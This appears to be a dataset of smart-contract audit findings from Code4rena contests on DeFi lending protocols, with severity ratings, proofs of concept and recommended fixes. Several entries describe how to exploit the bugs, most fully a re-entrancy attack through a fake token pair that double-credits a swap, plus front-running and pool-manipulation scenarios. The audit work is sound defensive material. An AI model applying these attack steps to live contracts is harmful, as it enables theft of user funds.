        require(msg.sender == address(inflationManager), Error.UNAUTHORIZED_ACCESS);
        require(!strategies\[strategy], Error.ADDRESS_ALREADY_SET);

        strategies\[strategy] = true;
        \_poolTotalStaked -= balances\[strategy];
        strategiesTotalStaked += balances\[strategy];

        return true;
    }

2.  You need to add below code at L126 of transfer() function.

    if(strategies\[msg.sender] != strategies\[account]) {
        if(strategies\[msg.sender]) { // from strategy to non-strategy
            \_poolTotalStaked += amount;
            strategiesTotalStaked -= amount;
        }
        else { // from non-strategy to strategy
            \_poolTotalStaked -= amount;
            strategiesTotalStaked += amount;
        }
    }

3.  You need to add below code at L170 of transferFrom() function.

    if(strategies\[src] != strategies\[dst]) {
        if(strategies\[src]) { // from strategy to non-strategy
            \_poolTotalStaked += amount;
            strategiesTotalStaked -= amount;
        }
        else { // from non-strategy to strategy
            \_poolTotalStaked -= amount;
            strategiesTotalStaked += amount;
        }
    }





***"
131.md,Fees from delisted pool still in reward handler will become stuck after delisting,medium,"Unclaimed fees from pool will be stuck.

### Proof of Concept

When delisting a pool the pool's reference is removed from address provider:

<https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/Controller.sol#L63>

Burning fees calls a dynamic list of all pools which no longer contains the delisted pool:

<https://github.com/code-423n4/2022-05-backd/blob/2a5664d35cde5b036074edef3c1369b984d10010/protocol/contracts/RewardHandler.sol#L39>

Since the list no longer contains the pool those fees will not be processed and will remain stuck in the contract

### Recommended Mitigation Steps

Call burnFees() before delisting a pool.

 




***"
101.md,`LenderPool`: Principal withdrawable is incorrectly calculated if start() is invoked with non-zero start fee,high,"[LenderPool.sol#L594-L599](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/LenderPool.sol#L594-L599)<br>
[LenderPool.sol#L399-L404](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/LenderPool.sol#L399-L404)<br>

The `_principalWithdrawable` calculated will be more than expected if `_start()` is invoked with a non-zero start fee, because the borrow limit is reduced by the fee, resulting in `totalSupply[id]` not being 1:1 with the borrow limit.

```jsx
function _calculatePrincipalWithdrawable(uint256 _id, address _lender) internal view returns (uint256) {
  uint256 _borrowedTokens = pooledCLConstants[_id].borrowLimit;
  uint256 _totalLiquidityWithdrawable = _borrowedTokens.sub(POOLED_CREDIT_LINE.getPrincipal(_id));
  uint256 _principalWithdrawable = _totalLiquidityWithdrawable.mul(balanceOf(_lender, _id)).div(_borrowedTokens);
  return _principalWithdrawable;
}
```

### Proof of Concept

Assume the following conditions:

*   Alice, the sole lender, provided `100_000` tokens: `totalSupply[_id] = 100_000`
*   `borrowLimit = 99_000` because of a 1% startFee
*   Borrower borrowed zero amount

When Alice attempts to withdraw her tokens, the `_principalWithdrawable` amount is calculated as

```jsx
_borrowedTokens = 99_000
_totalLiquidityWithdrawable = 99_000 - 0 = 99_000
_principalWithdrawable = 99_000 * 100_000 / 99_000 = 100_000
```

This is more than the available principal amount of `99_000`, so the withdrawal will fail.

### Recommended Mitigation Steps

One hack-ish way is to save the initial supply in `minBorrowAmount` (perhaps rename the variable to `minInitialSupply`) when the credit line is accepted, and replace `totalSupply[_id]` with it.

The other places where `minBorrowAmount` are used will not be affected by the change because:

*   startTime has been zeroed, so `start()` cannot be invoked (revert with error S1)
*   credit line status would have been changed to `ACTIVE` and cannot be changed back to `REQUESTED`, meaning the check below will be false regardless of the value of `minBorrowAmount`.

    ```jsx
    _status == PooledCreditLineStatus.REQUESTED &&
    block.timestamp > pooledCLConstants[_id].startTime &&
    totalSupply[_id] < pooledCLConstants[_id].minBorrowAmount
    ```

Code amendment example:

```jsx

function _accept(uint256 _id, uint256 _amount) internal {
  ...
  // replace delete pooledCLConstants[_id].minBorrowAmount; with the following:
  pooledCLConstants[_id].minInitialSupply = totalSupply[_id];
}

// update comment in _withdrawLiquidity
// Case 1: Pooled credit line never started because desired amount wasn't reached
// state will never revert back to REQUESTED if credit line is accepted so this case is never run

function _calculatePrincipalWithdrawable(uint256 _id, address _lender) internal view returns (uint256) {
  uint256 _borrowedTokens = pooledCLConstants[_id].borrowLimit;
  uint256 _totalLiquidityWithdrawable = _borrowedTokens.sub(POOLED_CREDIT_LINE.getPrincipal(_id));
  // totalSupply[id] replaced with minInitialSupply
  uint256 _principalWithdrawable = _totalLiquidityWithdrawable.mul(balanceOf(_lender, _id)).div(minInitialSupply);
  return _principalWithdrawable;
}
```

In `terminate()`, the shares withdrawable can simply be `_sharesHeld`.

```jsx
function terminate(uint256 _id, address _to) external override onlyPooledCreditLine nonReentrant {
  address _strategy = pooledCLConstants[_id].borrowAssetStrategy;
  address _borrowAsset = pooledCLConstants[_id].borrowAsset;
  uint256 _sharesHeld = pooledCLVariables[_id].sharesHeld;

  SAVINGS_ACCOUNT.withdrawShares(_borrowAsset, _strategy, _to, _sharesHeld, false);
  delete pooledCLConstants[_id];
  delete pooledCLVariables[_id];
}
```





***"
101.md,`PooledCreditLine`: termination likely fails because `_principleWithdrawable` is treated as shares,high,"[LenderPool.sol#L404-L406](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/LenderPool.sol#L404-L406)<br>

`_principalWithdrawable` is denominated in the borrowAsset, but subsequently treats it as the share amount to be withdrawn.

```jsx
// _notBorrowed = borrowAsset amount that isn't borrowed
// totalSupply[_id] = ERC1155 total supply of _id
// _borrowedTokens = borrower's specified borrowLimit
uint256 _principalWithdrawable = _notBorrowed.mul(totalSupply[_id]).div(_borrowedTokens);

SAVINGS_ACCOUNT.withdrawShares(_borrowAsset, _strategy, _to, _principalWithdrawable.add(_totalInterestInShares), false);
```

### Recommended Mitigation Steps

The amount of shares to withdraw can simply be `_sharesHeld`.

Note that this comes with the assumption that `terminate()` is only called when the credit line is `ACTIVE` or `EXPIRED` (consider ensuring this condition on-chain), because `_sharesHeld` **excludes principal withdrawals,** so the function will fail once a lender withdraws his principal.

```jsx
function terminate(uint256 _id, address _to) external override onlyPooledCreditLine nonReentrant {
  address _strategy = pooledCLConstants[_id].borrowAssetStrategy;
  address _borrowAsset = pooledCLConstants[_id].borrowAsset;
  uint256 _sharesHeld = pooledCLVariables[_id].sharesHeld;

  SAVINGS_ACCOUNT.withdrawShares(_borrowAsset, _strategy, _to, _sharesHeld, false);
  delete pooledCLConstants[_id];
  delete pooledCLVariables[_id];
}
```





***"
101.md,Pool Credit Line May Not Able to Start When _borrowAsset is Non ERC20 Compliant Tokens,medium,"`IERC20(_borrowAsset).transfer(_to, _fee);`

If the USDT token is supported as \_borrowAsset, the unsafe version of .transfer(\_to, \_fee) may revert as there is no return value in the USDT token contract’s transfer() implementation (but the IERC20 interface expects a return value).

Function start() will break when \_borrowAsset is USDT or Non ERC20 Compliant Tokens. USDT is one of the most borrowed Asset in DEFI. This may cause losing a lot of potential users.

### Proof of Concept

[LenderPool.sol#L327](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/LenderPool.sol#L327)<br>

### Recommended Mitigation Steps

Use .safeTransfer instead of .transfer

`IERC20(_borrowAsset).safeTransfer(_to, _fee);`






***"
101.md,Lack of access control allow anyone to `withdrawInterest()` for any lender,medium,"[LenderPool.sol#L442](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/LenderPool.sol#L442)<br>

```solidity
function withdrawInterest(uint256 _id, address _lender) external nonReentrant {
    _withdrawInterest(_id, _lender);
}

function _withdrawInterest(uint256 _id, address _lender) internal {
    address _strategy = pooledCLConstants[_id].borrowAssetStrategy;
    address _borrowAsset = pooledCLConstants[_id].borrowAsset;

    (uint256 _interestToWithdraw, uint256 _interestSharesToWithdraw) = _calculateInterestToWithdraw(
        _id,
        _lender,
        _strategy,
        _borrowAsset
    );
    pooledCLVariables[_id].sharesHeld = pooledCLVariables[_id].sharesHeld.sub(_interestSharesToWithdraw);

    if (_interestToWithdraw != 0) {
        SAVINGS_ACCOUNT.withdraw(_borrowAsset, _strategy, _lender, _interestToWithdraw, false);
    }
    emit InterestWithdrawn(_id, _lender, _interestSharesToWithdraw);
}
```

`withdrawInterest()` at a certain time may not be in the best interest of the specific `lender`.

It's unconventional and can potentially cause leak of value for the `lender`. For example, the lender may still want to accrued more interest from the strategy.

### Recommended Mitigation Steps

Change to:

```solidity
function withdrawInterest(uint256 _id, address _lender) external nonReentrant {
    require(msg.sender == _lender);
    _withdrawInterest(_id, _lender);
}
```





***"
101.md,Potentially depositing at unfavorable rate since anyone can deposit the entire lenderPool to a known strategy at a pre-fixed time,medium,"[LenderPool.sol#L312](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/LenderPool.sol#L312)<br>
[LenderPool.sol#L336](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/LenderPool.sol#L336)<br>

An attacker could keep track of the `totalSupply` of each LenderPool to see if it is more than the `minBorrowAmount`. If so, at `startTime`, which is pre-announced, the attacker could call `start`, which will trigger `SAVINGS_ACCOUNT.deposit()` of the entire pool assets to mint LP tokens from external strategy, for example, in CompoundYield.

There is potentially a big sum depositing into a known Compound  `cToken` contract at a known fixed time. Thus, the attacker could prepare the pool by depositing a fair sum first to lower the exchange rate before calling `start` in lenderPool. Hence, the deposit of the entire pool could be at a less favourable rate. This also applies to other potential strategies that are yet to be integrated. For example, in Curve pool, the attacker could prime the pool to be very imbalanced first and trigger the deposit and then harvest the arbitrage bonus by bringing the pool back to balance.

This attack can happen once only when the pooledCreditLine becomes active for each new lenderPool.

### Proof of Concept

Step 1: When a new LenderPool started, note the borrowAsset token and its strategy target pool, as well as the collection period (i.e. start time)

Step 2: Closer to the start time block number, if `totalSupply` of the lenderPool is bigger than the `minBorrowAmount`, prepare a good sum to manipulate the target strategy pool for unfavorable exchange rate or arbitrage opportunity afterwords.

Step 3: Call `start` function before others, also put in his own address to `_to` to pocket the protocol fee.

Step 4: Depending on the strategy pool, harvest arbitrage. Or perhaps just withdraw one's money from Step 2 for griefing.

### Recommended Mitigation Steps

Add access control on start, e.g. only borrower can call through pooledCreditLine.






***"
101.md,Interest accrued could be zero for small decimal tokens,medium,"[PooledCreditLine.sol#L1215-L1221](https://github.com/sublime-finance/sublime-v1/blob/46536a6d25df4264c1b217bd3232af30355dcb95/contracts/PooledCreditLine/PooledCreditLine.sol#L1215-L1221)<br>

Interest is calculated as

```jsx
(_principal.mul(_borrowRate).mul(_timeElapsed).div(YEAR_IN_SECONDS).div(SCALING_FACTOR));
```

It is possible for the calculated interest to be zero for principal tokens with small decimals, such as [EURS](https://etherscan.io/token/0xdb25f211ab05b1c97d595516f45794528a807ad8) (2 decimals). Accumulated interest can therefore be zero by borrowing / repaying tiny amounts frequently.

### Proof of Concept

Assuming a borrow interest rate of 5% (`5e17`) and principal borrow amount of `10_000` EURS (`10_000 * 1e2 = 1_000_000`), the interest rate calculated would be 0 if principal updates are made every minute (around 63s).

```jsx
// in this example, maximum duration for interest to be 0 is 63s
1_000_000 * 5e17 * 63 / (86400 * 365) / 1e18 = 0.99885 // = 0
```

While plausible, this method of interest evasion isn’t as economical for tokens of larger decimals like USDC and USDT (6 decimals).

### Recommended Mitigation Steps

Take caution when allowing an asset to be borrowed. Alternatively, scale the principal amount to precision (1e18) amounts.


 > Since there is no direct attack path (the steps required for this to occur would be: the token would first have to be whitelisted -> a loan request created using it -> lenders supply sufficient liquidity for this request to go active) and is, in essence, a value leak, we would suggest reducing the severity of the issue to (1) Low / (2) Medium.






***"
18.md,Reward computation is wrong,high,"The `LendingPair.accrueAccount` function distributes rewards **before** updating the cumulative supply / borrow indexes as well as the index + balance for the user (by minting supply tokens / debt).
This means the percentage of the user's balance to the total is not correct as the total can be updated several times in between.

```solidity
function accrueAccount(address _account) public {
  // distributes before updating accrual state
  _distributeReward(_account);
  accrue();
  _accrueAccountInterest(_account);

  if (_account != feeRecipient()) {
    _accrueAccountInterest(feeRecipient());
  }
}
```

**Example**: Two users deposit the same amounts in the same block. Thus, after some time they should receive the same tokens.
1. User A and B deposit 1000 tokens (in the same block) and are minted 1000 tokens in return. Total supply = `2000`
2. Assume after 50,000 blocks, `A` calls `accrueAccount(A)` which first calls `_distributeReward`. A is paid out 1000/2000 = 50% of the 50,000 blocks reward since deposit. Afterwards, `accrue` + `_accrueAccountInterest(A)` is called and `A` is minted 200 more tokens due to supplier lending rate. The supply **totalSupply is now 2200**.
3. After another 50,000 blocks, `A` calls `accrueAccount(A)` again. which first calls `_distributeReward`. A is paid out 1200/2200 = **54.5454% of the 50,000 blocks reward since deposit.**

From here, you can already see that `A` receives more than 50% of the 100,000 block rewards although they deposited at the same time as `B` and didn't deposit or withdraw any funds.
`B` will receive `~1000/2200 = 45%` (ignoring any new LP supply tokens minted for `A`'s second claim.)

The impact is that wrong rewards will be minted users which do not represent their real fair share. Usually, users will get fewer rewards than they should receive, as their individual interest was not updated yet, but the totals (total debt and total supply) could have been updated by other accounts in between.

There are two issues that both contribute to it:
- total LP supply and total debt must be updated by the **total new interest** when `accrue` is called, not only increased by an **individual user**'s interest. See my other issue ""Reward computation is wrong"" that goes into more depth
- Lending/borrow accrual must happen before reward distribution"
18.md,`LendingPair.liquidateAccount` does not accrue and update `cumulativeInterestRate`,high,"The `LendingPair.liquidateAccount` function does not accrue and update the `cumulativeInterestRate` first, it only calls `_accrueAccountInterest` which does not update and instead uses the old `cumulativeInterestRate`.

The liquidatee (borrower)'s state will not be up-to-date.
I could skip some interest payments by liquidating myself instead of repaying if I'm under-water.
As the market interest index is not accrued, the borrower does not need to pay any interest accrued from the time of the last accrual until now.

Recommend calling `accrueAccount` instead of `_accrueAccountInterest`"
18.md,`LendingPair.liquidateAccount` fails if tokens are lent out,high,"The `LendingPair.liquidateAccount` function tries to pay out underlying supply tokens to the liquidator using `_safeTransfer(IERC20(supplyToken), msg.sender, supplyOutput)` but there's no reason why there should be enough `supplyOutput` amount in the contract, the contract only ensures `minReserve`.

As a result, no liquidations can be performed if all tokens are lent out.
**Example:** User A supplies 1k\$ WETH, User B supplies 1.5k\$ DAI and borrows the ~1k\$ WETH (only leaves `minReserve`). The ETH price drops but user B cannot be liquidated as there's not enough WETH in the pool anymore to pay out the liquidator.

Recommend minting LP supply tokens to `msg.sender` instead, these are the LP supply tokens that were burnt from the borrower. This way the liquidator basically seizes the borrower's LP tokens."
18.md,Chainlink - Use `latestRoundData` instead of `latestAnswer` to run more validations,medium,"delamo, also found by 0xRajeev, cmichel, greiart, and shw_

`UniswapV3Oracle.sol` is calling `latestAnswer` to get the last WETH price. This method will return the last value, but you won't be able to check if the data is fresh.
On the other hand, calling the method `latestRoundData` allow you to run some extra validations

```solidity
  (
    roundId,
    rawPrice,
    ,
    updateTime,
    answeredInRound
  ) = AggregatorV3Interface(XXXXX).latestRoundData();
  require(rawPrice > 0, ""Chainlink price <= 0"");
  require(updateTime != 0, ""Incomplete round"");
  require(answeredInRound >= roundId, ""Stale price"");
```

See the chainlink [documentation](https://docs.chain.link/docs/faq/#how-can-i-check-if-the-answer-to-a-round-is-being-carried-over-from-a-previous-round) for more information."
18.md,`safeTransferFrom` in `TransferHelper` is not `safeTransferFrom`,medium,"A non standard ERC20 token would always raise error when calling `_safeTransferFrom`.  If a user creates a USDT/DAI pool and deposit into the pool he would find out there's never a counterpart deposit. See `TransferHelper.sol` [#L19](https://github.com/code-423n4/2021-07-wildcredit/blob/82c48d73fd27a9d4d5d4a395b3affcef4ef6c5c8/contracts/TransferHelper.sol#L19).

`TransferHelper` does not uses `SafeERC20` library as the function name implies.

A sample POC:
```solidity
usdt.functions.approve(lending_pair.address, deposit_amount).transact({'from': w3.eth.accounts[0]})
lending_pair.functions.deposit(w3.eth.accounts[0], usdt.address, deposit_amount).transact({'from': w3.eth.accounts[0]})
```

Error Message:
```solidity
  Error: Transaction reverted: function returned an unexpected amount of data
      at LendingPair._safeTransferFrom (contracts/TransferHelper.sol:20)
      at LendingPair.deposit (contracts/LendingPair.sol:95)
```

Recommend using `openzeppelin` `SafeERC20` in `transferHelper` (and any other contract that uses IERC20)."
18.md,`_wethWithdrawTo` is vulnerable re-entrancy,medium,"The function `withdrawBorrowETH` invokes `_wethWithdrawTo` and later `_checkMinReserve`, however, the check of reserve is not necessary here, as function `_wethWithdrawTo` also does that after transferring the ether. However, this reserve check might be bypassed as `TransferHelper`.`_wethWithdrawTo` uses a low level call that is vulnerable to re-entrancy attacks. As this `MIN_RESERVE` sounds like an important value, you should consider preventing re-entrancy attacks here.
```solidity
  // Prevents division by zero and other undesirable behavior
  uint public constant MIN_RESERVE = 1000;
```
Recommend considering using [re-entrancy guard](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/security/ReentrancyGuard.sol) on all main action functions (e.g. `deposit`, `withdraw`, `borrow`,`repay`, etc...):"
18.md,Total LP supply & total debt accrual is wrong,medium,"The total debt and total supply only increase when debt/supply is minted to the user when it should increase by the entire new interest amount on each accrual.

```solidity
function accrueAccount(address _account) public {
  _distributeReward(_account);
  // accrue only updates cumulativeInterestRate to the newInterest
  // newInterest is not added to total debt or total LP supply!
  accrue();
  // instead total debt / total LP supply is increased here by a much smaller amount, the new interest specific for the updating user
  _accrueAccountInterest(_account);

  if (_account != feeRecipient()) {
    _accrueAccountInterest(feeRecipient());
  }
}
```

The borrow rates (see `borrowRatePerBlock`) are wrong due to the wrong utilization ratio: The borrow utilization rate uses `LPToken.totalSupply`. Assume there's a single lender supplying \$100k, another single borrower borrows \$70k (ignoring irrelevant details like liquidation and the borrower not putting up collateral for the sake of the argument).
After some time debt accrued and the supplier ""updates"" by calling `accrue` (but the borrower does not update), this increases the LP total supply to, say, \$110k, while total debt is not updated. The utilization rate and thus the borrow rate is now less than before (from 70/100=70% to 70/110=63%). In reality, it should have increased as the supplier interest is only a fraction of the borrower accumulated debt. From now on less debt than expected accrues until the borrower is updated and total debt is increased.
To get the correct borrow rates in the current system, every borrower and every supplier would need to be updated on every accrual which is infeasible.

Recommend doing it like Compound/Aave, increase total debt and total supply on each accrual by the **total** new interest (not by the specific user's interest only).
This might require a bigger refactor because the LP token is treated as a (""lazy-evaluated"") rebasing token and the total supply is indeed the total tokens in circulation `LP.totalSupply()` and one cannot mint the new interest to all users at once in each `accrue`.
That's why Compound uses an interest-bearing token and tracks total supply separately and Aave uses a real rebasing token that dynamically scales the balance in `balanceOf` and must not be updated individually for each user."
18.md,No check of `MAX_LIQ_FEES` in contructor of `Controller`,low,"Both the functions `setLiqParamsToken` and `setLiqParamsDefault` have a check to make sure that
`_liqFeeCaller` + `_liqFeeSystem` <= `MAX_LIQ_FEES`

However the constructor of `Controller` sets the same parameters and doesn't have this check.
It seems logical to also do the check in the `controller`, otherwise the parameters could be set outside of the wanted range.

`Controller.sol` [#L49](https://github.com/code-423n4/2021-07-wildcredit/blob/main/contracts/Controller.sol#L49)
```solidity
constructor( address _interestRateModel, uint _liqFeeSystemDefault, uint _liqFeeCallerDefault) {
    ...
    liqFeeSystemDefault = _liqFeeSystemDefault;
    liqFeeCallerDefault = _liqFeeCallerDefault;

function setLiqParamsToken( address _token, uint    _liqFeeSystem, uint    _liqFeeCaller ) external onlyOwner {
    require(_liqFeeCaller + _liqFeeSystem <= `MAX_LIQ_FEES`, ""Controller: fees too high"");
...
    liqFeeSystemToken[_token] = _liqFeeSystem;
    liqFeeCallerToken[_token] = _liqFeeCaller;

function setLiqParamsDefault( uint    _liqFeeSystem, uint    _liqFeeCaller) external onlyOwner {
    require(_liqFeeCaller + _liqFeeSystem <= MAX_LIQ_FEES, ""Controller: fees too high"");
    liqFeeSystemDefault = _liqFeeSystem;
    liqFeeCallerDefault = _liqFeeCaller;
```

Recommend adding something like the following in the constructor of `Controller`
 ```solidity
require(liqFeeCallerDefault + liqFeeSystemDefault <= MAX_LIQ_FEES, ""Controller: fees too high"");
```

**- [talegift (Wild Credit) confirmed](https://github.com/code-423n4/2021-07-wildcredit-findings/issues/24)**"
18.md,Uniswap oracle assumes `PairToken <> WETH` liquidity,low,"The `UniswapV3Oracle.tokenPrice` function gets the price by combining the chainlink ETH price with the TWAP prices of the `token <> pairToken` and `pairToken <> WETH` pools.
It is therefore required that the `pairToken <> WETH` pool exists and has sufficient liquidity to be tamper-proof.

When listing lending pairs for tokens that have a WETH pair with low liquidity (at 0.3% fees) the prices can be easily manipulated leading to liquidations or underpriced borrows.
This can happen for tokens that don't use `WETH` as their default trading pair, for example, if they prefer a stablecoin, or `WBTC`.

Recommend ensuring there's enough liquidity on the `pairToken <> WETH` Uniswap V3 0.3% pair, either manually or programmatically."
18.md,Simple interest formula is used,low,"The `_accrueInterest` function uses a simple interest formula to compute the accrued debt, instead of a compounding formula. This means the actual borrow rate and interest for suppliers depend on how often updates are made. This difference should be negligible in highly active markets, but it could lead to a lower borrow rate in low-activity markets.

Recommend ensuring that the lending pairs is accrued regularly, or switching to a compound interest formula (which has a higher gas cost due to exponentiation, but can be approximated, see Aave).

**- [talegift (Wild Credit) acknowledged](https://github.com/code-423n4/2021-07-wildcredit-findings/issues/119)**"
18.md,`LendingPair.pendingSupplyInterest` is not accurate,low,"The `LendingPair.pendingSupplyInterest` does not accrue the new interest since the last update and therefor the returned value is not accurate.

Recommend accruing it first such that `cumulativeInterestRate` updates and `_newInterest` returns the updated value.

**- [talegift (Wild Credit) confirmed](https://github.com/code-423n4/2021-07-wildcredit-findings/issues/124)**"
18.md,Migrate Rewards Without Distribution,low,"With the `migrateRewards` function, owner can transfer all reward token into other address. Owner should distribute reward balance before migrating rewards.

1. Navigate to ""https://github.com/code-423n4/2021-07-wildcredit/blob/82c48d73fd27a9d4d5d4a395b3affcef4ef6c5c8/contracts/RewardDistribution.sol""
2. See functionality on the ""`migrateRewards`"" function.
3. According to function, owner can transfer all  reward balance to another address.

Recommend that owner should distribute reward balance before migrating rewards."
18.md,`minBorrowUSD` not initialized in the contract,low,"The parameter `minBorrowUSD` of the contract `Controller` isn't initialized.
If someone is able to Borrow before the function `setMinBorrowUSD` is called, he might be able to borrow a very small amount. This might be unwanted.

`Controller.sol` [#L27](https://github.com/code-423n4/2021-07-wildcredit/blob/main/contracts/Controller.sol#L27)
```solidity
uint public minBorrowUSD;

function setMinBorrowUSD(uint _value) external onlyOwner {
  minBorrowUSD = _value;
}
```
`LendingPair.sol` [#L553](https://github.com/code-423n4/2021-07-wildcredit/blob/main/contracts/LendingPair.sol#L553)
```solidity
function _checkBorrowLimits(address _token, address _account) internal view {
  ...
  require(accountBorrowUSD >= controller.minBorrowUSD(), ""LendingPair: borrow amount below minimum"");
```

Recommend Initializing `minBorrowUSD` via the constructor or set a reasonable default in the contract.

**- [talegift (Wild Credit) confirmed](https://github.com/code-423n4/2021-07-wildcredit-findings/issues/25)**"
18.md,`LendingPair`: Avoid rounding error in `_accrueAccountSupply()`,low,"`supplyInterest` is split between the account and the system, ie. `supplyInterest = newSupplyAccount + newSupplySystem`. Hence, an additional call to the `_systemRate` can be avoided in the calculation of `newSupplySystem`, as well as potential rounding errors. See [L401-L403](https://github.com/code-423n4/2021-07-wildcredit/blob/main/contracts/LendingPair.sol#L401-L403) in `LendingPair.sol` .

Recommend that L403 be changed to `newSupplySystem = supplyInterest - newSupplyAccount;`

**- [talegift (Wild Credit) acknowledged](https://github.com/code-423n4/2021-07-wildcredit-findings/issues/37)**"
18.md,`UniswapV3Oracle`: Reduce `minObservations` to uint16,low,"Reducing `minObservations` to uint16 will help prevent erroneous `minObservations` values from being set (ie. `> 65535`) by the owner without needing checks. Otherwise, the `isPoolValid` will always return false, causing reverts in calling `tokenPrice` and `addPool` functions (and other functions calling these). See [L25](https://github.com/code-423n4/2021-07-wildcredit/blob/main/contracts/UniswapV3Oracle.sol#L25) and [L101](https://github.com/code-423n4/2021-07-wildcredit/blob/main/contracts/UniswapV3Oracle.sol#L101) of `UniswapV3Oracle.sol`.

The maximum number of observations available is 65535 (see [`UniswapV3Pool.sol` L39](https://github.com/Uniswap/uniswap-v3-core/blob/main/contracts/UniswapV3Pool.sol#L39)), which is equivalent to `type(uint16).max`.

Hence,

- `uint public minObservations` can be reduced to `uint16 public minObservations`

- `(, , , , uint observationSlots , ,) = IUniswapV3Pool(poolAddress).slot0();` becomes `(, , , , uint16 observationSlots , ,) = IUniswapV3Pool(poolAddress).slot0();`

**- [talegift (Wild Credit) confirmed](https://github.com/code-423n4/2021-07-wildcredit-findings/issues/55)**"
18.md,`repayAll()` and `repayAllETH()` vulnerable to front-running,low,"The `repayAll()` and `repayAllETH()` functions allow any user to pay off debt of another user. Since all of the debt is going to be paid, no amount is specified, allowing the recipient of the repayment to front-run the transaction to increase their debt. The risk of this issued was lowered as it depended on the user having enough tokens and allowance in the case of `repayAll()`, or having a `msg.sender` higher than the current debt in the case of `repayAllEth()`.

The affected lines are `LendingPair.sol` [#L14](https://github.com/code-423n4/2021-07-wildcredit/blob/main/contracts/LendingPair.sol#L147) and [#L156](https://github.com/code-423n4/2021-07-wildcredit/blob/main/contracts/LendingPair.sol#L156).

The scenario for `repayAll()` is the following:

1. Alice pays off 5 of Bob's Dai debt using `repayAll()`.
2. Bob monitors the mempool for Alice's transaction, and front-runs it by taking out as much debt as Alice's allowance (and therefore balance) to the contract.
3. `debtOf[_token][_account]` now returns the higher amount and pays off Bob's new debt.

The scenario for `repayAllEth()` is similar:

1. Alice pays off 0.5 of Bob's Weth debt using `repayAllEth()`.
2. Bob monitors the mempool for Alice's transaction, and front-runs it by taking out as much debt as Alice's `msg.value` amount used.
3. `debtOf[address(WETH)][_account]` now returns the higher amount and pays off Bob's new debt.

This issue can be mitigated by enforcing a minimum time to hold debt - e.g. not allowing to repay debt for at least 6 blocks. Alternatively, the `repay()` function could be used to replace the 2 affected functions by passing in the `_amount` as the total debt (looked up off-chain and used in the dapp, for example) so that only up to a certain amount of debt is paid. This also means the `repay()` function would need to be made `payable`, and that the `msg.value` is validated to be equal to the `_amount` parameter.

**- [talegift (Wild Credit) confirmed](https://github.com/code-423n4/2021-07-wildcredit-findings/issues/125)**"
18.md,Critical protocol parameter configuration/changes should have sanity/threshold checks,low,"Input validation on key function parameters is a best-practice. Not applying sanity/threshold checks will allow incorrect values to be set accidentally/maliciously and may significantly affect the security/functionality of the protocol.

Except for checks on liquidation fees and collaterization factor, the codebase does not have input validation (sanity/threshold checks) on key protocol parameters in setter functions that are callable only by contract owners. Given that the fundamental value proposition of the protocol is to address risk management using isolated lending pairs, it becomes even more important to enforce sanity/threshold validation on protocol parameters in order to increase confidence in them, reduce risk and prevent accidental/malicious changes that increases risk significantly. The sanity/threshold values may be configurable in a time-delayed manner by owner/governance instead of hardcoding and enforcing unilaterally.

**Scenario:** Protocol is initialized/configured with absurd/unreasonable (i.e. very low/high) values of critical parameters such as `depositLimit`, `borrowLimit`, `minBorrowUSD`, pool allocation points, `totalRewardPerBlock`, `poolFee`, `twapPeriod` or `minObservations`. Owners/users fail to check or understand the impact of these absurd values until the protocol’s functionality or profitability is affected significantly.

See similar high-severity finding from [Consensys Diligence Audit of Shell Protocol](https://consensys.net/diligence/audits/2020/06/shell-protocol/#certain-functions-lack-input-validation-routines). See issue page for referenced code.

Recommend enforcing sanity/threshold checks in all `onlyOwner` setters."
18.md,Erc20 Race condition for allowance,low,"Due to the implementation of the `approve()` function in `LPTokenMaster.sol`  it's possible for a user to over spend their allowance in certain situations. See [unboxing erc20 approve issues](https://www.adrianhetman.com/unboxing-erc20-approve-issues/).

Recommend that, instead of having a direct setter for allowances, `decreaseAllowance` and `increaseAllowance` functions should be exposed which decreases and increases allowances for a recipient respectively."
18.md,The interest rate is calculated based on assumptions on the block time,low,"The `InterestRateModel` contract assumes that the average block time is 13.2 seconds. However, the block time could range from 13.0 to 30.27, as we have seen in the past. The use of inaccurate block time could cause inaccurate borrow and supply rates. See `InterestRateModel.sol` [#L17-L18](https://github.com/code-423n4/2021-07-wildcredit/blob/main/contracts/InterestRateModel.sol#L17-L18) and [Ethereum Average Block Time Chart (Etherscan.io)](https://etherscan.io/chart/blocktime)

Recommend allowing authorized parties to set the values of the `LOW_RATE` and `HIGH_RATE` variables. Or, designing them to be dynamically adjusted when the block time changes drastically. Alternatively, also recommend calculating the interests and rewards based on `block.timestamp` instead of `block.number`."
3.md,Re-entrancy bug allows inflating balance,high,"One can call the `MarginRouter.crossSwapExactTokensForTokens` function first with a fake contract disguised as a token pair:
`crossSwapExactTokensForTokens(0.0001 WETH, 0, [ATTACKER_CONTRACT], [WETH, WBTC])`. When the amounts are computed by the `amounts = UniswapStyleLib.getAmountsOut(amountIn - fees, pairs, tokens);` call, the attacker contract returns fake reserves that yield 1 WBTC for the tiny input. The resulting amount is credited through `registerTrade`. Afterwards, `_swapExactT4T([0.0001 WETH, 1 WBTC], 0, [ATTACKER_CONTRACT], [WETH, WBTC])` is called with the fake pair and token amounts. At some point `_swap` is called, the starting balance is stored in `startingBalance`, and the attacker contract call allows a re-entrancy:

```solidity
pair.swap(0.0001 WETH, 1 WBTC, FUND, new bytes(0)); // can re-enter here
```

From the ATTACKER_CONTRACT we re-enter the `MarginRouter.crossSwapExactTokensForTokens(30 WETH, 0, WETH_WBTC_PAIR, [WETH, WBTC])` function with the actual WETH <> WBTC pair contract. All checks pass, the FUND receives the actual amount, the outer `_swap` continues execution after the re-entrancy and the `endingBalance >= startingBalance + amounts[amounts.length - 1]` check passes as well because the inner swap successfully deposited these funds. We end up doing 1 real trade but being credited twice the output amount.

